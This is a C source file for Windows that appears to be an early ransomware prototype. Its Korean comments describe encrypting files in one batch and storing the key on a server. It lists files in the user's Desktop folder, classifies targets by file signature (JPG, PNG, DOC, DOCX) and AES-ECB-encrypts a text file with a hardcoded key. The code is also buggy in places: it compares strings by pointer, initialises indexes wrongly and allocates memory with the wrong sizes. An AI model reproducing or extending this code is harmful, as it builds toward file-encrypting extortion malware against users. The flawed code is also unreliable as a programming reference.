#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <Windows.h>
#include <locale.h>
#include <time.h>
#include "aes.h"
#include "files.h"

#define AES_BLOCK_SIZE  16
#define SIGN_BUFF_SIZE  8

// 파일 암호화 한테로 묶어 놓고 키를 서버에 저장해 준다.
// 타깃을 구조체로 묶어 재분류 하라.
// TODO : 파일 이름에 띄어쓰기가 있는 경우는?


int txt_encrypt();
void classifyFiles(struct FILES files, wchar_t *dir, wchar_t fileList[100][100]);

int main() {

    _wsetlocale(LC_ALL, L"Korean" );
    wchar_t* dirPrefix; 
    dirPrefix = (wchar_t*)malloc(sizeof(wchar_t*) * 100); 
    wcscpy(dirPrefix, L"C:\\Users\\");
    wchar_t *userName = getUserName();
    wcscat(dirPrefix, userName);
    wcscat(dirPrefix, L"\\test_folder");


    wchar_t* dir = (wchar_t*)malloc(sizeof(wchar_t*)*100);
    memset(dir, 0, sizeof(wchar_t*) * 100);
    wcscat(dir, dirPrefix);

    struct FILEDIR fileDir;
    struct FILES files;
    files.doc_index, files.docx_index, files.jpg_index, files.png_index, files.txt_index = 0;


    //[1] Desktop
    wcscat(dir, DESKTOP_DIR);
    getDirectoryFileList(dir, fileDir.desktop);
    for(int i = 0; i < 100; i++) {
        if(fileDir.desktop[i][0] == '\0') break;
        printf("%S\n", fileDir.desktop[i]);
    }
    //[1] Desktop 분류
    classifyFiles(files, dir, fileDir.desktop);

    free(dir);
    free(dirPrefix);
    
}



void classifyFiles(struct FILES files, wchar_t *dir, wchar_t fileList[100][100]) {

    char buff_sign[SIGN_BUFF_SIZE];
    DWORD readn;

    printf("================================================================================================= \n");
    printf("                                      Classify Files start                                        \n");
    printf("================================================================================================= \n");

    for (int i = 2; i < 100; i++) {
        if(fileList[i][0] == '\0') break;
        
        HANDLE file1 = CreateFileW(fileList[i], GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (file1 == INVALID_HANDLE_VALUE) {
            printf("file1 open error\n");
            return;
        }
        ReadFile(file1, buff_sign, SIGN_BUFF_SIZE, &readn, NULL);
        
        if(!strncmp(buff_sign, JPG_SIGN, 4)) {
            wprintf(L"\n JPG fileList[%d] : %s \n", i, fileList[i]);

        } else if(!strncmp(buff_sign, PNG_SIGN, 8)) {
            wprintf(L"\n PNG fileList[%d] : %s \n", i, fileList[i]);

        } else if(!strncmp(buff_sign, DOC_SIGN, 4)) {
            wprintf(L"\n DOC fileList[%d] : %s \n", i, fileList[i]);

        } else if(!strncmp(buff_sign, DOCX_SIGN, 8)) {
            wprintf(L"\n DOCX fileList[%d] : %s \n", i, fileList[i]);

        } else if(buff_sign == ".txt"){
            wprintf(L"\n txt fileList[%d] : %s \n", i, fileList[i]);

        } else {
            wprintf(L"\n nothing fileList[%d] : %s \n", i, fileList[i]);
        }

    }
}

int txt_encrypt() {
    
    uint8_t key[16] = { 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c };

    // 키 램던 생성
    // srand(time(NULL));
    // for(int i = 0; i < 16; i++){
    //     key[i] = rand() % 0xff;
    //     printf("0x%02x ", key[i]);
    // }

    uint8_t iv[]  = { 0x00, };
    unsigned char* buff_txt;
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);
    
   
    buff_txt = calloc(AES_BLOCK_SIZE, sizeof(char));
    DWORD readn;
    DWORD writen;

    wchar_t srcName[100] = {0x00, };
    wchar_t desName[100] = {0x00, };
    wchar_t resName[100] = {0x00, };
    wcscat(srcName, L".\\test.txt");
    wcscat(desName, L".\\test_dec.txt");
    wcscat(resName, L".\\res.txt");

    // 파일 읽기
    HANDLE file1 = CreateFileW(srcName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(file1 == INVALID_HANDLE_VALUE) {
        printf("file1 open error\n");
        return 0;
    }

    // 파일 읽기 및 암호화 하기
    HANDLE file2 = CreateFileW(desName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(file2 == INVALID_HANDLE_VALUE) {
        printf("file2 open error\n");
        return 0;
    }

    while (ReadFile(file1, buff_txt, AES_BLOCK_SIZE, &readn, NULL)) {
        if(readn == 0) break;

        for(readn; readn < AES_BLOCK_SIZE; readn++) {
            buff_txt[readn] = 0x00;
        }
        
        AES_ECB_encrypt(&ctx, buff_txt);

        WriteFile(file2, buff_txt, readn, &writen, NULL);
        buff_txt = calloc(AES_BLOCK_SIZE, sizeof(unsigned char));
    }
    
    CloseHandle(file1);
    CloseHandle(file2);


    file2 = CreateFileW(desName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(file2 == INVALID_HANDLE_VALUE) {
        printf("file2 open error\n");
        return 0;
    }

    HANDLE file3 = CreateFileW(resName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if(file3 == INVALID_HANDLE_VALUE) {
        printf("file3 open error\n");
        return 0;
    }

    while (ReadFile(file2, buff_txt, AES_BLOCK_SIZE, &readn, NULL)) {
        if(readn == 0) break;
        
        AES_ECB_decrypt(&ctx, buff_txt);
        

        WriteFile(file3, buff_txt, readn, &writen, NULL);
        buff_txt = calloc(AES_BLOCK_SIZE, sizeof(unsigned char));
    }
    
}



